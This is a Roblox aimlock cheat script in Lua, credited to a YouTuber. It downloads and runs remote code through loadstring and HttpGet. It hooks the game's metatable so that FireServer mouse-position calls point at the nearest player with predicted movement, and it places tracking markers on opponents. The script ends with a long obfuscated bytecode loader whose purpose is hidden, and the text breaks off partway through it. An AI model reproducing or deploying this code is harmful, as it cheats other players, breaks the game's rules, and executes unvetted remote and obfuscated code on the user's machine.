--[[

This script wasn't protected because it was made very hard to read by the person who created it. 
I had to fix a lot of mistakes, 
and all other locks use this same bad script. It's very hard to understand.

modified by me / aka TheRealX_ORA on YT

-TheRealX_ORA

UPDATE LOG: fix some bugs
making my own aimlock after i make tpwalk v4 & camlock
]]--

Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/vKhonshu/intro2/main/ui2"))()
local NotifyLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/vKhonshu/intro/main/ui"))()
NotifyLib.prompt('Rainbow Sunshine', 'Modified & Created By: TheRealX_ORA on YT', 5)

-- Service
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local VirtualInputManager = game:service("VirtualInputManager")

-- User Input Variables
local isTouchEnabled = UserInputService.TouchEnabled
local isMouseEnabled = UserInputService.MouseEnabled
local isKeyboardEnabled = UserInputService.KeyboardEnabled
local isGamepadEnabled = UserInputService.GamepadEnabled

if isTouchEnabled then
    
    NotifyLib.prompt('Mobile Device Detected', 'Loading Q Tool..', 5)
    
    -- Key To Click
    getgenv().keytoclick = "Q"

    -- Tool
    local tool = Instance.new("Tool")
    tool.RequiresHandle = false
    tool.Name = "Smite"
    
    -- Key To Click Simulates
    tool.Activated:connect(function()
        VirtualInputManager:SendKeyEvent(true, keytoclick, false, game)
    end)

    -- Places Tool In Player Backpack
    tool.Parent = game:GetService("Players").LocalPlayer:WaitForChild("Backpack")
    
    local player = game:GetService("Players").LocalPlayer
    
    -- Ensure the tool is moved back to the backpack upon character removal
    player.CharacterRemoving:Connect(function()
        tool.Parent = player.Backpack
    end)
    
    NotifyLib.prompt('Mobile Q Tool', 'Q Tool Has Successfully Loaded!', 5)
    
elseif isMouseEnabled and isMouseEnabled then
    NotifyLib.prompt('Pc Device Detected', 'Smite them with Q!', 5)
    
elseif isGamepadEnabled and isTouchEnabled then
    
    NotifyLib.prompt('Controller And Mobile Device Detected', 'Loading Q Tool..', 5)
    
    -- Key To Click
    getgenv().keytoclick = "Q"

    -- Tool
    local tool = Instance.new("Tool")
    tool.RequiresHandle = false
    tool.Name = "Smite"
    
    -- Key To Click Simulates
    tool.Activated:connect(function()
        VirtualInputManager:SendKeyEvent(true, keytoclick, false, game)
    end)

    -- Places Tool In Player Backpack
    tool.Parent = game:GetService("Players").LocalPlayer:WaitForChild("Backpack")
    
    local player = game:GetService("Players").LocalPlayer
    
    -- Ensure the tool is moved back to the backpack upon character removal
    player.CharacterRemoving:Connect(function()
        tool.Parent = player.Backpack
    end)
    
    NotifyLib.prompt('Controller And Mobile Q Tool', 'Q Tool Has Successfully Loaded!', 5)

elseif isMouseEnabled and isMouseEnabled and isTouchEnabled then
    
    NotifyLib.prompt('Hybird Mobile Device Detected', 'Loading Q Tool..', 5)
    
    -- Key To Click
    getgenv().keytoclick = "Q"

    -- Tool
    local tool = Instance.new("Tool")
    tool.RequiresHandle = false
    tool.Name = "Smite"
    
    -- Key To Click Simulates
    tool.Activated:connect(function()
        VirtualInputManager:SendKeyEvent(true, keytoclick, false, game)
    end)

    -- Places Tool In Player Backpack
    tool.Parent = game:GetService("Players").LocalPlayer:WaitForChild("Backpack")
    
    local player = game:GetService("Players").LocalPlayer
    
    -- Ensure the tool is moved back to the backpack upon character removal
    player.CharacterRemoving:Connect(function()
        tool.Parent = player.Backpack
    end)
    
    NotifyLib.prompt('Hybird Mobile Q Tool', 'Q Tool Has Successfully Loaded!', 5)
end

Settings = {   
    rewrittenmain = {
		Enabled = true,
		Key = "q", -- change the key
		DOT = true,
		AIRSHOT = true,
        NOTIF = true,			
        AUTOPRED = true,			
        FOV = math.huge,		
        RESOVLER = false
    }
}

local SelectedPart = "HumanoidRootPart"
local Prediction = true
local PredictionValue = 0.1357363


local AnchorCount = 0
local MaxAnchor = 50

local CC = game:GetService("Workspace").CurrentCamera
local Plr;
local enabled = false
local accomidationfactor = 0.136
local mouse = game.Players.LocalPlayer:GetMouse()
local data = game.Players:GetPlayers()

local placemarker = Instance.new("Part", game.Workspace)
placemarker.Material = Enum.Material.ForceField
placemarker.Reflectance = 0.1
placemarker.Shape = Enum.PartType.Ball
placemarker.TopSurface = Enum.SurfaceType.Smooth
placemarker.BottomSurface = Enum.SurfaceType.Smooth
placemarker.FrontSurface = Enum.SurfaceType.Smooth
placemarker.BackSurface = Enum.SurfaceType.Smooth
placemarker.LeftSurface = Enum.SurfaceType.Smooth
placemarker.RightSurface = Enum.SurfaceType.Smooth
        
local hue = 0

-- Update function to change the part's color over time
RunService.Heartbeat:Connect(function(deltaTime)
    hue = (hue + deltaTime * 0.1) % 1
    local color = Color3.fromHSV(hue, 1, 1)
    placemarker.Color = color
end)

function makemarker(Parent, Adornee, Color, Size, Size2)
    local e = Instance.new("BillboardGui", Parent)
    e.Name = "PP"			
    e.Adornee = Adornee			
    e.Size = UDim2.new(Size, Size2, Size, Size2)			
    e.AlwaysOnTop = Settings.rewrittenmain.DOT
    
    local a = Instance.new("Frame", e)			
    if Settings.rewrittenmain.DOT == true then				
        a.Size = UDim2.new(2, 0, 2, 0)
    else
		a.Size = UDim2.new(0, 0, 0, 0)
	end
    
	if Settings.rewrittenmain.DOT == true then
        a.Transparency = 0				
        a.BackgroundTransparency = 0
	else
		a.Transparency = 1
		a.BackgroundTransparency = 1
	end
    
    a.BackgroundColor3 = Color
    local hue = 0
    
    -- Update function to change the part's color over time
    RunService.Heartbeat:Connect(function(deltaTime)
        hue = (hue + deltaTime * 0.1) % 1
        local color = Color3.fromHSV(hue, 1, 1)
        a.BackgroundColor3 = color
    end)
    
			
    local g = Instance.new("UICorner", a) 
		if Settings.rewrittenmain.DOT == false then
			g.CornerRadius = UDim.new(0, 0)
		else
			g.CornerRadius = UDim.new(1, 1) 
		end	
    
    return(e)
    
end

function noob(player)
    local character
    repeat wait() until player.Character
    local handler = makemarker(guimain, player.Character:WaitForChild(SelectedPart), Color3.fromRGB(0, 0, 0), 0.3, 3)
    handler.Name = player.Name			
    player.CharacterAdded:connect(function(Char) handler.Adornee = Char:WaitForChild(SelectedPart) end)
			
    spawn(function()			            
        while wait() do      
            if player.Character then
            end
		end
	end)
end

for i = 1, #data do
	if data[i] ~= game.Players.LocalPlayer then
		noob(data[i])
	end
end

game.Players.PlayerAdded:connect(function(Player)
	noob(Player)
end)

spawn(function()
	placemarker.Anchored = true
	placemarker.CanCollide = false
	
    if Settings.rewrittenmain.DOT == true then
        placemarker.Size = Vector3.new(10, 10, 10)
    else
		placemarker.Size = Vector3.new(0, 0, 0)
	end
        
	placemarker.Transparency = 0.50
			
    if Settings.rewrittenmain.DOT then
        makemarker(placemarker, placemarker, Color3.fromRGB(255, 0, 0), 0.40, 0)
	end
end)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
    if k == Settings.rewrittenmain.Key and Settings.rewrittenmain.Enabled then
        if enabled == true then
            enabled = false

            if Settings.rewrittenmain.NOTIF == true then
                Plr = getClosestPlayerToCursor()
                game.StarterGui:SetCore("SendNotification", {
                    Title = "Unlocked",
                    Text = "Spared: "..tostring(Plr.Character.Humanoid.DisplayName),
                    Duration = 1.5
                })
            end
        else
            Plr = getClosestPlayerToCursor()
            enabled = true
            if Settings.rewrittenmain.NOTIF == true then
                game.StarterGui:SetCore("SendNotification", {
                    Title = "Locked",
                    Text = "Victim: "..tostring(Plr.Character.Humanoid.DisplayName),
                    Duration = 2.5
                })
            end
        end
    end
end)



function getClosestPlayerToCursor()
	local closestPlayer
    local shortestDistance = Settings.rewrittenmain.FOV
	
    for i, v in pairs(game.Players:GetPlayers()) do			
        if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
            
            local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)					
            local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude	
            
            if magnitude < shortestDistance then						
                closestPlayer = v						
                shortestDistance = magnitude					
            end				
        end			
    end			
    return closestPlayer		
end

local lastNotificationTime = 0
local pingvalue = nil;
local split = nil;
local ping = nil;

local function generatePredictionValue(ping)
    local baseValues = {
        {maxPing = 10, base = 0.095},
        {maxPing = 30, base = 0.105},
        {maxPing = 50, base = 0.115},
        {maxPing = 70, base = 0.125},
        {maxPing = 90, base = 0.135},
        {maxPing = 110, base = 0.145},
        {maxPing = 130, base = 0.155},
        {maxPing = 150, base = 0.165},
        {maxPing = 170, base = 0.175},
        {maxPing = 190, base = 0.185},
        {maxPing = 210, base = 0.195},
        {maxPing = 230, base = 0.205},
        {maxPing = 250, base = 0.215},
        -- Add more if needed
    }

    local predictionGenerator = 0.225
    for _, range in ipairs(baseValues) do
        if ping <= range.maxPing then
            predictionGenerator = range.base
            break
        end
    end

    local numberOfDigits = math.random(12, 15)
    predictionGenerator = tostring(predictionGenerator)
    for _ = 1, numberOfDigits do
        local randomDigit = tostring(math.random(0, 9))
        predictionGenerator = predictionGenerator .. randomDigit
    end

    return predictionGenerator
end

local lastNotificationTime = 0
game:GetService("RunService").Stepped:connect(function()
    if enabled and Plr.Character ~= nil and Plr.Character:FindFirstChild("HumanoidRootPart") then
        placemarker.CFrame = CFrame.new(Plr.Character.HumanoidRootPart.Position + (Plr.Character.HumanoidRootPart.Velocity * accomidationfactor))
    else
        placemarker.CFrame = CFrame.new(0, 9999, 0)
    end
    if Settings.rewrittenmain.AUTOPRED == true then
        local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        local split = string.split(pingvalue, '(')
        local ping = tonumber(split[1])

        local predictionValue = generatePredictionValue(ping)

        if tick() - lastNotificationTime >= 5 then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Auto Prediction",
                Text = "Prediction: "..predictionValue,
                Duration = 2.5
            })
            lastNotificationTime = tick()
        end
    end
end)


local mt = getrawmetatable(game)
local old = mt.__namecall
		
setreadonly(mt, false)		
mt.__namecall = newcclosure(function(...)
    local args = {...}
    if enabled and getnamecallmethod() == "FireServer" and Settings.rewrittenmain.Enabled and Plr.Character ~= nil then            
        if args[2] == "UpdateMousePos" then        
            
            if Prediction == true then            
                if type(args[3]) == "table" then
                    args[3] = {
                        Plr.Character[SelectedPart].Position + (Plr.Character[SelectedPart].Velocity * PredictionValue)
                        }
                elseif type(args[3]) ~= "table" then
                    args[3] = Plr.Character[SelectedPart].Position + (Plr.Character[SelectedPart].Velocity * PredictionValue)
                end
                    
			else
                if type(args[3]) == "table" then
                    args[3] = {
                        Plr.Character[SelectedPart].Position
                        }
                elseif type(args[3]) ~= "table" then
                    args[3] = Plr.Character[SelectedPart].Position
                end
			end  
                
        elseif args[2] == "MOUSE" then
                
            if Prediction == true then
                if type(args[3]) == "table" then
                    args[3] = {
                        Plr.Character[SelectedPart].Position + (Plr.Character[SelectedPart].Velocity * PredictionValue)
                        }
                elseif type(args[3]) ~= "table" then
                    args[3] = Plr.Character[SelectedPart].Position + (Plr.Character[SelectedPart].Velocity * PredictionValue)
                end
                    
			else
				if type(args[3]) == "table" then
                    args[3] = {
                        Plr.Character[SelectedPart].Position
                        }
                elseif type(args[3]) ~= "table" then
                    args[3] = Plr.Character[SelectedPart].Position
                end            
            end
                
        elseif args[2] == "MousePos" then
            if Prediction == true then
                if type(args[3]) == "table" then
                    args[3] = {
                        Plr.Character[SelectedPart].Position + (Plr.Character[SelectedPart].Velocity * PredictionValue)
                        }
                elseif type(args[3]) ~= "table" then
                    args[3] = Plr.Character[SelectedPart].Position + (Plr.Character[SelectedPart].Velocity * PredictionValue)
                end
                    
			else
				if type(args[3]) == "table" then
                    args[3] = {
                        Plr.Character[SelectedPart].Position
                        }
                elseif type(args[3]) ~= "table" then
                    args[3] = Plr.Character[SelectedPart].Position
                end            
            end 
        end	            
        return old(unpack(args))			
    end			     
    return old(...)
end)

RunService.RenderStepped:Connect(function()		
    if Settings.rewrittenmain.RESOVLER == true and Plr.Character ~= nil and enabled and Settings.rewrittenmain.Enabled then	
           if Settings.rewrittenmain.AIRSHOT == true and enabled and Plr.Character ~= nil then					
                if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall

						
                    if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
						AnchorCount = AnchorCount + 1
						if AnchorCount >= MaxAnchor then							                               
                            Prediction = false
							wait(2)
							AnchorCount = 0;							
                        end						
                    else
						Prediction = true
						AnchorCount = 0;
					end	                                               
                    SelectedPart = "LeftFoot"					                
                else						                
                    if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
						AnchorCount = AnchorCount + 1
                        if AnchorCount >= MaxAnchor then
							Prediction = false
							wait(2)
							AnchorCount = 0;
						end          
                    else
						Prediction = true
						AnchorCount = 0;
					end
						SelectedPart = "HumanoidRootPart"
					end				                               
                else
                    if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then						
                        AnchorCount = AnchorCount + 1
						if AnchorCount >= MaxAnchor then
							Prediction = false
							wait(2)
							AnchorCount = 0;
						end
					else
						Prediction = true
						AnchorCount = 0;
					end
			SelectedPart = "HumanoidRootPart"
		end
	else
		SelectedPart = "HumanoidRootPart"
	end
end)

NotifyLib.prompt('TheRealX_ORA', 'Loaded Rainbow Sunshine!', 5)

-- DO NOT DELETE THIS:
--[[

 .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |  ____  ____  | || |              | || |     ____     | || |  _______     | || |      __      | |
| | |_  _||_  _| | || |              | || |   .'    `.   | || | |_   __ \    | || |     /  \     | |
| |   \ \  / /   | || |              | || |  /  .--.  \  | || |   | |__) |   | || |    / /\ \    | |
| |    > `' <    | || |              | || |  | |    | |  | || |   |  __ /    | || |   / ____ \   | |
| |  _/ /'`\ \_  | || |              | || |  \  `--'  /  | || |  _| |  \ \_  | || | _/ /    \ \_ | |
| | |____||____| | || |   _______    | || |   `.____.'   | || | |____| |___| | || ||____|  |____|| |
| |              | || |  |_______|   | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
Obfuscated by TheRealX_ORA on YT 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=0;local v19;local v20;local v21;local v22;local v23;local v24;local v25;local v26;local v27;local v28;local v29;local v30;while true do if (v18==5) then v27=v24;v28=nil;function v28(...) return {...},v12("#",...);end v18=6;end if (v18==1) then v21=nil;function v21(v31,v32,v33) if v33 then local v71=(v31/((570 -(367 + 201))^(v32-(928 -(214 + 713)))))%((5 -3)^(((v33-(2 -1)) -(v32-(878 -(282 + 595)))) + (1 -0))) ;return v71-(v71%(2 -1)) ;else local v72=(2 -0)^(v32-(1066 -(68 + 997))) ;return (((v31%(v72 + v72))>=v72) and (620 -(555 + (1334 -(226 + 1044))))) or (931 -(857 + (322 -248))) ;end end v22=nil;v18=2;end if (v18==3) then v24=nil;function v24() local v34,v35,v36,v37=v1(v16,v19,v19 + (120 -((58 -26) + 85)) );v19=v19 + 4 + 0 ;return (v37 * (3720433 + 13056783)) + (v36 * (66493 -(892 + 65))) + (v35 * (610 -354)) + v34 ;end v25=nil;v18=4;end if (v18==6) then v29=nil;function v29() local v38=0;local v39;local v40;local v41;local v42;local v43;local v44;local v45;local v46;while true do if (v38==(819 -(436 + 383))) then v39=0;v40=nil;v38=15 -(9 + 5) ;end if (v38==2) then v43=nil;v44=nil;v38=3;end if (v38~=3) then else v45=nil;v46=nil;v38=4;end if (v38~=1) then else v41=nil;v42=nil;v38=2;end if (v38==4) then while true do if (1~=v39) then else v42=nil;v43=nil;v39=2;end if (v39==(379 -(85 + 291))) then v46=nil;while true do if (v40==1) then local v103=1265 -(243 + 1022) ;local v104;while true do if (v103==(0 -0)) then v104=0 + 0 ;while true do if (1==v104) then for v115=1,v45 do local v116=1180 -(1123 + 57) ;local v117;local v118;local v119;local v120;while true do if (v116~=0) then else local v126=0 + 0 ;while true do if (v126==(255 -(163 + 91))) then v116=1931 -(1869 + 61) ;break;end if (v126==(0 + 0)) then v117=0 -0 ;v118=nil;v126=1;end end end if (v116~=(1 -0)) then else local v127=0 + 0 ;while true do if (v127~=1) then else v116=2 -0 ;break;end if (v127==0) then v119=nil;v120=nil;v127=1 + 0 ;end end end if (v116==2) then while true do if (v117==(1475 -(1329 + 145))) then v120=nil;while true do if (v118~=0) then else local v327=0;while true do if (v327~=(971 -(140 + 831))) then else local v350=0;while true do if (v350==(1851 -(1409 + 441))) then v327=719 -(15 + 703) ;break;end if ((0 + 0)~=v350) then else v119=v22();v120=nil;v350=439 -(262 + 176) ;end end end if (v327==(1722 -(345 + 1376))) then v118=1;break;end end end if (v118==1) then if (v119==(689 -(198 + 490))) then v120=v22()~=(0 -0) ;elseif (v119==2) then v120=v25();elseif (v119~=(6 -3)) then else v120=v26();end v46[v115]=v120;break;end end break;end if (v117==(1206 -(696 + 510))) then local v273=0;while true do if (v273==1) then v117=1;break;end if (0~=v273) then else v118=0 -0 ;v119=nil;v273=1;end end end end break;end end end v44[1265 -(1091 + 171) ]=v22();v104=1 + 1 ;end if (v104==(0 -0)) then v45=v24();v46={};v104=3 -2 ;end if (v104~=2) then else v40=2;break;end end break;end end end if (v40==2) then local v105=374 -(123 + 251) ;while true do if (v105~=0) then else for v108=1,v24() do local v109=0 -0 ;local v110;local v111;while true do if (v109==(698 -(208 + 490))) then v110=0 + 0 ;v111=nil;v109=1;end if (v109==1) then while true do if (v110==(0 + 0)) then v111=v22();if (v21(v111,1,837 -(660 + 176) )~=0) then else local v226=0 + 0 ;local v227;local v228;local v229;local v230;while true do if (1==v226) then v229=nil;v230=nil;v226=2;end if (v226==0) then v227=202 -(14 + 188) ;v228=nil;v226=1;end if (v226==(677 -(534 + 141))) then while true do if ((2 + 1)~=v227) then else if (v21(v229,3 + 0 ,3 + 0 )~=1) then else v230[4]=v46[v230[4]];end v41[v108]=v230;break;end if (v227==(1 -0)) then local v344=0 -0 ;while true do if (v344==0) then v230={v23(),v23(),nil,nil};if (v228==(0 -0)) then local v356=0 + 0 ;local v357;while true do if (v356~=(0 -0)) then else v357=0 -0 ;while true do if ((867 -(550 + 317))~=v357) then else v230[3 -0 ]=v23();v230[4]=v23();break;end end break;end end elseif (v228==(1 -0)) then v230[3]=v24();elseif (v228==(5 -3)) then v230[288 -(134 + 151) ]=v24() -((1667 -(970 + 695))^16) ;elseif (v228~=(5 -2)) then else local v366=0;local v367;local v368;local v369;while true do if (v366==1) then v369=nil;while true do if (v367==0) then v368=1990 -(582 + 1408) ;v369=nil;v367=1;end if (v367==(3 -2)) then while true do if (0==v368) then v369=0;while true do if (v369==0) then v230[3]=v24() -(2^(19 -3)) ;v230[15 -11 ]=v23();break;end end break;end end break;end end break;end if (v366==0) then v367=0;v368=nil;v366=1825 -(1195 + 629) ;end end end v344=1;end if (1==v344) then v227=2 -0 ;break;end end end if (v227==(243 -(187 + 54))) then local v345=0;while true do if (v345==(780 -(162 + 618))) then if (v21(v229,1,1 + 0 )==1) then v230[2]=v46[v230[2 + 0 ]];end if (v21(v229,2,2)==1) then v230[6 -3 ]=v46[v230[4 -1 ]];end v345=1;end if (v345~=(1 + 0)) then else v227=1639 -(1373 + 263) ;break;end end end if (v227==0) then v228=v21(v111,2,1003 -(451 + 549) );v229=v21(v111,4,2 + 4 );v227=1;end end break;end end end break;end end break;end end end for v112=1 -0 ,v24() do v42[v112-(1 -0) ]=v29();end v105=1385 -(746 + 638) ;end if (v105~=1) then else return v44;end end end if (v40==(0 + 0)) then local v106=0 -0 ;while true do if (v106==2) then v40=342 -(218 + 123) ;break;end if (v106==(1582 -(1535 + 46))) then local v107=0 + 0 ;while true do if (v107~=(0 + 0)) then else v43={};v44={v41,v42,nil,v43};v107=1468 -(899 + 568) ;end if (v107~=1) then else v106=2;break;end end end if (v106==0) then v41={};v42={};v106=1 + 0 ;end end end end break;end if (v39==(0 -0)) then v40=0;v41=nil;v39=604 -(268 + 335) ;end if (v39~=(292 -(60 + 230))) then else v44=nil;v45=nil;v39=3;end end break;end end end v30=nil;v18=7;end if (v18==4) then function v25() local v47=572 -(426 + 146) ;local v48;local v49;local v50;local v51;local v52;local v53;while true do if (v47==(1 + 2)) then if (v52==((2601 -(466 + 679)) -(282 + 1174))) then if (v51==0) then return v53 * (811 -(569 + 242)) ;else local v96=0 -0 ;while true do if ((0 + 0)==v96) then v52=1025 -(706 + 318) ;v50=0;break;end end end elseif (v52==2047) then return ((v51==(0 -0)) and (v53 * (1/((3009 -1758) -((835 -(4 + 110)) + (1515 -985)))))) or (v53 * NaN) ;end return v8(v53,v52-1023 ) * (v50 + (v51/((1273 -(945 + 326))^((2029 -(106 + 1794)) -77)))) ;end if ((1 + 0)==v47) then v50=701 -(271 + (1013 -(57 + 527))) ;v51=(v21(v49,1 + 0 ,1520 -(1408 + 92) ) * ((1088 -(461 + 625))^(1320 -(993 + 295)))) + v48 ;v47=1 + 1 ;end if (((372 + 801) -(418 + 753))==v47) then v52=v21(v49,8 + 13 ,4 + 27 );v53=((v21(v49,10 + 22 )==(1 + 0)) and  -(530 -(406 + 123))) or (1770 -(1749 + 20)) ;v47=1 + 2 ;end if (v47==(1322 -(316 + 933 + 73))) then v48=v24();v49=v24();v47=1 + 0 ;end end end v26=nil;function v26(v54) local v55;if  not v54 then local v73=1427 -(41 + 1386) ;while true do if (v73==((0 -0) -0)) then v54=v24();if (v54==((0 + 0) -0)) then return "";end break;end end end v55=v3(v16,v19,(v19 + v54) -(104 -(17 + 86)) );v19=v19 + v54 ;local v56={};for v69=1 + 0 , #v55 do v56[v69]=v2(v1(v3(v55,v69,v69)));end return v6(v56);end v18=5;end if (v18==2) then function v22() local v57=v1(v16,v19,v19);v19=v19 + 1 ;return v57;end v23=nil;function v23() local v58=0 + 0 ;local v59;local v60;while true do if (0==v58) then v59,v60=v1(v16,v19,v19 + (3 -1) );v19=v19 + ((1279 -(323 + 889)) -(30 + 35)) ;v58=1 + 0 ;end if (v58==(1258 -(1043 + 214))) then return (v60 * (967 -711)) + v59 ;end end end v18=3;end if (v18==0) then v19=1;v20=nil;v16=v4(v3(v16,5),"..",function(v61) if (v1(v61,2)==79) then v20=v0(v3(v61,1,1));return "";else local v74=v2(v0(v61,16));if v20 then local v78=0;local v79;while true do if (v78==0) then v79=v5(v74,v20);v20=nil;v78=1;end if (v78==1) then return v79;end end else return v74;end end end);v18=1;end if (v18==7) then function v30(v62,v63,v64) local v65=0;local v66;local v67;local v68;while true do if (v65==1) then v68=v62[3];return function(...) local v80=v66;local v81=v67;local v82=v68;local v83=v28;local v84=1;local v85= -1;local v86={};local v87={...};local v88=v12("#",...) -1 ;local v89={};local v90={};for v94=0,v88 do if (v94>=v82) then v86[v94-v82 ]=v87[v94 + 1 ];else v90[v94]=v87[v94 + 1 ];end end local v91=(v88-v82) + 1 ;local v92;local v93;while true do local v95=0;while true do if (v95==0) then v92=v80[v84];v93=v92[1];v95=1;end if (v95==1) then if (v93<=30) then if (v93<=14) then if (v93<=6) then if (v93<=2) then if (v93<=0) then if (v92[2]==v90[v92[4]]) then v84=v84 + 1 ;else v84=v92[3];end elseif (v93==1) then local v129=v81[v92[3]];local v130;local v131={};v130=v10({},{__index=function(v231,v232) local v233=0;local v234;while true do if (v233==0) then v234=v131[v232];return v234[1][v234[2]];end end end,__newindex=function(v235,v236,v237) local v238=0;local v239;while true do if (0==v238) then v239=v131[v236];v239[1][v239[2]]=v237;break;end end end});for v240=1,v92[4] do local v241=0;local v242;while true do if (v241==1) then if (v242[1]==45) then v131[v240-1 ]={v90,v242[3]};else v131[v240-1 ]={v63,v242[3]};end v89[ #v89 + 1 ]=v131;break;end if (0==v241) then v84=v84 + 1 ;v242=v80[v84];v241=1;end end end v90[v92[2]]=v30(v129,v130,v64);else v90[v92[2]]=v90[v92[3]];end elseif (v93<=4) then if (v93==3) then local v135=0;local v136;local v137;local v138;while true do if (v135==1) then v138=0;for v309=v136,v92[4] do v138=v138 + 1 ;v90[v309]=v137[v138];end break;end if (v135==0) then v136=v92[2];v137={v90[v136](v90[v136 + 1 ])};v135=1;end end else v90[v92[2]]={};end elseif (v93>5) then local v140=v92[2];local v141={v90[v140](v13(v90,v140 + 1 ,v92[3]))};local v142=0;for v243=v140,v92[4] do v142=v142 + 1 ;v90[v243]=v141[v142];end else v90[v92[2]]=v30(v81[v92[3]],nil,v64);end elseif (v93<=10) then if (v93<=8) then if (v93>7) then local v144=v92[2];local v145={v90[v144](v13(v90,v144 + 1 ,v92[3]))};local v146=0;for v246=v144,v92[4] do v146=v146 + 1 ;v90[v246]=v145[v146];end else v90[v92[2]]=v90[v92[3]][v92[4]];end elseif (v93>9) then if (v90[v92[2]]==v92[4]) then v84=v84 + 1 ;else v84=v92[3];end else local v149=v92[2];local v150=v90[v149];for v249=v149 + 1 ,v92[3] do v7(v150,v90[v249]);end end elseif (v93<=12) then if (v93>11) then if (v92[2]==v90[v92[4]]) then v84=v84 + 1 ;else v84=v92[3];end else local v151=0;local v152;while true do if (v151==0) then v152=v92[2];do return v90[v152](v13(v90,v152 + 1 ,v92[3]));end break;end end end elseif (v93>13) then local v153=v92[2];do return v90[v153](v13(v90,v153 + 1 ,v92[3]));end else local v154=0;local v155;local v156;local v157;while true do if (v154==1) then v157=0;for v312=v155,v92[4] do v157=v157 + 1 ;v90[v312]=v156[v157];end break;end if (v154==0) then v155=v92[2];v156={v90[v155](v90[v155 + 1 ])};v154=1;end end end elseif (v93<=22) then if (v93<=18) then if (v93<=16) then if (v93==15) then local v158=v92[2];local v159=v90[v158];local v160=v92[3];for v250=1,v160 do v159[v250]=v90[v158 + v250 ];end else v90[v92[2]][v92[3]]=v92[4];end elseif (v93==17) then do return;end else local v163=0;local v164;while true do if (v163==0) then v164=v92[2];do return v13(v90,v164,v164 + v92[3] );end break;end end end elseif (v93<=20) then if (v93==19) then local v165=0;local v166;while true do if (v165==0) then v166=v92[2];do return v13(v90,v166,v85);end break;end end else local v167=0;local v168;while true do if (0==v167) then v168=v92[2];v90[v168]=v90[v168](v13(v90,v168 + 1 ,v92[3]));break;end end end elseif (v93>21) then local v169=0;local v170;local v171;while true do if (v169==1) then for v315=v170 + 1 ,v92[4] do v171=v171   .. v90[v315] ;end v90[v92[2]]=v171;break;end if (v169==0) then v170=v92[3];v171=v90[v170];v169=1;end end else local v172=v92[2];v90[v172]=v90[v172](v90[v172 + 1 ]);end elseif (v93<=26) then if (v93<=24) then if (v93==23) then local v174=v92[2];v90[v174](v90[v174 + 1 ]);else local v175=v92[2];v90[v175]=v90[v175](v90[v175 + 1 ]);end elseif (v93>25) then local v177=v92[2];local v178=v90[v92[3]];v90[v177 + 1 ]=v178;v90[v177]=v178[v92[4]];else v90[v92[2]]=v30(v81[v92[3]],nil,v64);end elseif (v93<=28) then if (v93>27) then local v183=v90[v92[4]];if  not v183 then v84=v84 + 1 ;else v90[v92[2]]=v183;v84=v92[3];end elseif v90[v92[2]] then v84=v84 + 1 ;else v84=v92[3];end elseif (v93==29) then local v184=0;local v185;local v186;while true do if (1==v184) then for v316=1, #v89 do local v317=v89[v316];for v329=0, #v317 do local v330=v317[v329];local v331=v330[1];local v332=v330[2];if ((v331==v90) and (v332>=v185)) then local v346=0;while true do if (0==v346) then v186[v332]=v331[v332];v330[1]=v186;break;end end end end end break;end if (v184==0) then v185=v92[2];v186={};v184=1;end end elseif  not v90[v92[2]] then v84=v84 + 1 ;else v84=v92[3];end elseif (v93<=45) then if (v93<=37) then if (v93<=33) then if (v93<=31) then local v121=v92[2];local v122=v90[v92[3]];v90[v121 + 1 ]=v122;v90[v121]=v122[v92[4]];elseif (v93==32) then local v187=v92[2];v90[v187](v90[v187 + 1 ]);else local v188=v92[2];v90[v188]=v90[v188](v13(v90,v188 + 1 ,v92[3]));end elseif (v93<=35) then if (v93>34) then if ((v92[3]=="_ENV") or (v92[3]=="getfenv")) then v90[v92[2]]=v64;else v90[v92[2]]=v64[v92[3]];end else local v190=0;local v191;local v192;local v193;while true do if (v190==1) then v193=v92[3];for v318=1,v193 do v192[v318]=v90[v191 + v318 ];end break;end if (v190==0) then v191=v92[2];v192=v90[v191];v190=1;end end end elseif (v93==36) then v90[v92[2]]=v92[3];else local v196=v92[3];local v197=v90[v196];for v253=v196 + 1 ,v92[4] do v197=v197   .. v90[v253] ;end v90[v92[2]]=v197;end elseif (v93<=41) then if (v93<=39) then if (v93==38) then local v199=v81[v92[3]];local v200;local v201={};v200=v10({},{__index=function(v254,v255) local v256=0;local v257;while true do if (v256==0) then v257=v201[v255];return v257[1][v257[2]];end end end,__newindex=function(v258,v259,v260) local v261=0;local v262;while true do if (v261==0) then v262=v201[v259];v262[1][v262[2]]=v260;break;end end end});for v263=1,v92[4] do local v264=0;local v265;while true do if (v264==1) then if (v265[1]==45) then v201[v263-1 ]={v90,v265[3]};else v201[v263-1 ]={v63,v265[3]};end v89[ #v89 + 1 ]=v201;break;end if (v264==0) then v84=v84 + 1 ;v265=v80[v84];v264=1;end end end v90[v92[2]]=v30(v199,v200,v64);else for v266=v92[2],v92[3] do v90[v266]=nil;end end elseif (v93==40) then if  not v90[v92[2]] then v84=v84 + 1 ;else v84=v92[3];end else 